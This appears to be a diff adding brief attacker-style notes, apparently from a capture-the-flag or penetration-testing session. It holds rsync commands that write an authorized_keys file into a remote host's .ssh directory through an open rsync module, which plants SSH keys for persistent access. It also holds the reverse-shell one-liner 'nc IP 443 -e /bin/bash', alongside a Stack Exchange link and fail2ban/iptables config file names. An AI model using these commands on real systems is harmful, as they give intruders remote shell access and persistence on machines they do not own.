@@ -1,0 +1,10 @@
+rsync /dev/null  192.168.97.126::fox/.ssh/
+rsync -r ./.ssh/authorized_keys 192.168.97.126::fox/.ssh/
+set correct permissions
+https://unix.stackexchange.com/questions/36540/why-am-i-still-getting-a-password-prompt-with-ssh-with-public-key-authentication
+
+
+
+jail.conf
+iptables-multiport.conf
+nc IP 443 -e /bin/bash
